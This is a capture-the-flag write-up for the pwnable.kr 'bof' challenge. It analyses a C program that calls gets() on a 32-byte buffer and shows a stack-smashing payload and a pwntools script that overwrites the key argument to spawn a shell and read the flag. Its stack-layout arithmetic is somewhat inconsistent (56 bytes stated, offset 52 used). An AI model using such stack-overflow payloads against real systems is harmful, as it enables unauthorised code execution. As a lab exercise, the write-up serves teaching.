# bof writeup

## Challenge infos

```text
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?


ssh bof@pwnable.kr -p2222 (pw: guest)
```

## Server content

```text
--- ls -la ---
total 44
drwxr-x---   2 root bof   4096 Apr  3 16:04 .
drwxr-xr-x 118 root root  4096 Jun  1 12:05 ..
-rw-r--r--   1 root root   220 Feb 14 11:22 .bash_logout
-rw-r--r--   1 root root  3771 Feb 14 11:22 .bashrc
-rwxr-xr-x   1 root bof  15300 Mar 26 13:03 bof
-rw-r--r--   1 root root   342 Mar 26 13:09 bof.c
-rw-r--r--   1 root root   811 Apr  3 16:04 .profile
-rw-r--r--   1 root root    86 Apr  3 16:03 readme
--- id ---
uid=1003(bof) gid=1003(bof) groups=1003(bof)
--- cat file---
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

--- file binary ---
bof: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1cabd158f67491e9edb3df0219ac3a4ef165dc76, for GNU/Linux 3.2.0, not stripped
```
## Exploitation objective
* The ssh user is ```bof```, group ```bof```
* The ```flag``` file is readable only by the user ```bof_pwn``` or the group ```root```
* The ```bof``` binary is a 32bit ELF executable by the ```bof_pwn``` user or members of the ```bof``` group and is ```suid``` meaning that it executes with the rights of its user even if called by a member of its group

This means that if we pwn the ```bof``` executable we can gain read access to the ```flag``` file via suid user ```bof_pwn```.

The ```bof``` executable is certainly compiled from the ```bof.c``` source code, let's have a look.

## C code analysis
```c
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

* The ```main()``` function takes command line arguments and calls the ```func()``` function with the argument ```0xdeadbeef```


```c
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
```

* The ```func()``` function declares a character array ```overflowme``` of size 32 bytes
* It then prints a prompt to the user and calls the unsafe ```gets()``` function to read input into the ```overflowme``` array
* The comment ```// smash me!``` suggests that this function is vulnerable to a buffer overflow attack, as the ```gets()``` function does not check the length of the input and can write beyond the bounds of the array

```c
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
```
* If the ```key``` argument is equal to ```0xcafebabe```, the function changes the effective group ID of the process to the effective group ID of the process (which is likely the group of the user running the program) and then executes a shell using ```system("/bin/sh")```
* This means that if we can control the value of ```key``` by overflowing the ```overflowme``` array, we can gain a shell with the effective group ID of the user running the program

## Buffer overflow exploitations

* A buffer overflow occurs when a program writes more data to a buffer than it can hold, causing adjacent memory to be overwritten
* In this case, the ```overflowme``` array is 32 bytes long, but the ```gets()``` function does not limit the input size, allowing us to write more than 32 bytes
* By overflowing the ```overflowme``` array, we can overwrite the ```key``` variable in the stack with the value ```0xcafebabe```, which will allow us to execute the shell command in the ```if``` statement

## Exploitation

* To exploit this vulnerability, we need to provide an input that is longer than 32 bytes, specifically enough to overwrite the ```key``` variable with the value ```0xcafebabe```
* The stack layout for the ```func()``` function will look something like this:

```
| Address       | Value                |
|---------------|----------------------|
| 0x...         | key (0xdeadbeef)     |
| 0x...         | Return address       |
| 0x...         | Old base pointer     |
| 0x...         | free space           |
| 0x...         | overflowme[31]       |
| 0x...         | overflowme[30]       |
| 0x...         | ...                  |
| 0x...         | overflowme[0]        |
```

* We need to fill the buffer with 32 bytes of data, then the 12 bytes of space, then the 8 bytes of olds ebp and esp, and finally the 4 bytes of the value we want to set for ```key```, which is ```0xcafebabe```

* The total length of the input should be 32 + 12 + 8 + 4 = 56 bytes
* The input should look like this: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa\xbe\xba\xfe\xca


## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
inject = fit({52: p32(0xcafebabe)})
```
* Use the `fit` function from pwntools to create a payload that fills the buffer and overwrites the `key` variable with `0xcafebabe`
```python
server = ssh('bof', 'pwnable.kr', 2222, 'guest')
io = server.process(['nc', '0', '9000'])

io.sendline(inject)
io.sendline('cat flag')

result = io.recvuntil(b'\n', drop=True)

io.close()
server.close()

print(result)
```
* Connect to the server using SSH and start a process that listens on port 9000
* Send the payload to the process
* Send the command `cat flag` to read the content of the `flag` file
* Receive the output until a newline character is encountered and print the result